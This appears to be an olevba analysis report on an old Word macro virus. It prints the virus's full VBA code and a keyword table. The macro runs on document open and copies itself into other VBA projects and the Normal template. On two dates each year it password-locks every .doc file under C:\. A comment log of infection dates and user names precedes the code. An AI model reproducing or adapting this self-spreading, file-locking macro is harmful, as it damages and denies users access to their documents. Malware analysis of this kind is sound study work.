olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Eight941.d-4e39fe1c7325dab5ead9ea29ce601dd5a6fdfa9b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Eight941.d-4e39fe1c7325dab5ead9ea29ce601dd5a6fdfa9b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 12:04:46 PM - Wednesday, 23 Dec 1998
' BCBSA
'



' 11:32:13 AM - Thursday, 24 Dec 1998
' BCBSA
'



' 11:43:52 AM - Monday, 28 Dec 1998
' BCBSA
'



' 12:03:48 PM - Wednesday, 6 Jan 1999
' Tricia
'



' 11:45:55 AM - Thursday, 14 Jan 1999
' Debra C. Hopkinson
'



' 09:27:34 AM - Friday, 15 Jan 1999
' Rajeev Duggirala
'



' 02:35:40 PM - Thursday, 28 Jan 1999
' Krishna Devulapalli
'



' 09:17:55 PM - Thursday, 4 Feb 1999
' Muralidharan Swaminathan
'



' 02:49:41 PM - Monday, 8 Feb 1999
' cyber
'



' 08:59:15 PM - Monday, 15 Feb 1999
' xx
'



' 01:02:02 PM - Friday, 19 Feb 1999
' RAMESH
'



' 05:59:21 PM - Saturday, 20 Feb 1999
' guest
'



' 06:24:19 PM - Wednesday, 10 Mar 1999
' oasys
'



' 10:45:35 AM - Thursday, 18 Mar 1999
' InfoSys
'



' 07:54:09 PM - Tuesday, 6 Apr 1999
' CF
'



' 12:38:11 PM - Saturday, 10 Apr 1999
' Alex
'



' 09:11:00 AM - Wednesday, 23 Jun 1999
' Craig Shugart
'



' 04:47:08 PM - Tuesday, 31 Aug 1999
' Nancy Hansen
'



' 04:27:23 PM - Tuesday, 5 Oct 1999
' Patsy Jones
'



' 01:26:41 AM - Wednesday, 13 Oct 1999
' ETC Carrel #1
'



' 03:02:21 PM - Monday, 18 Oct 1999
' Carrol 2
'



' 08:50:09 AM - Monday, 1 Nov 1999
' Carrol 2
'



' 01:11:30 AM - Friday, 10 Dec 1999
' Colby Hanover
'



' 09:17:49 AM - Friday, 17 Dec 1999
' Hunt Hanover
'







Private Sub Document_Open()
On Error GoTo 0
Dim i, j As Integer
j = -1
For i = 1 To Application.VBE.VBProjects.Count
    If Application.VBE.VBProjects(i).Name = "Normal" Then
        j = i
    End If
    If Application.VBE.VBProjects(i).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = False Then
        Dim B, l As Integer
            If j > 0 Then
                If Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = True Then
                    B = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Lines(B, B + l)
                Else
                    B = Me.VBProject.VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Me.VBProject.VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Me.VBProject.VBComponents(1).CodeModule.Lines(B, B + l)
            End If
        End If
    End If
Next i
If (Month(Date) = 11 And Day(Date) = 10) Or (Month(Date) = 7 And Day(Date) = 1) Then
Set fs = Application.FileSearch
    fs.LookIn = "c:\"
    fs.FileName = "*.doc"
    fs.SearchSubFolders = True
    If fs.Execute() > 0 Then
        For i = 1 To fs.FoundFiles.Count
            On Error GoTo Exitsub
            Documents.Open FileName:=fs.FileSearch, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False
            Options.AllowFastSave = True
            Options.BackgroundSave = True
            Options.CreateBackup = False
            Options.SavePropertiesPrompt = False
            Options.SaveNormalPrompt = False
            ActiveDocument.Password = "xyz"
            ActiveDocument.Save
            ActiveDocument.Close
Exitsub:
        On Error GoTo 0
        Next i
    End If
End If
End Sub









































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

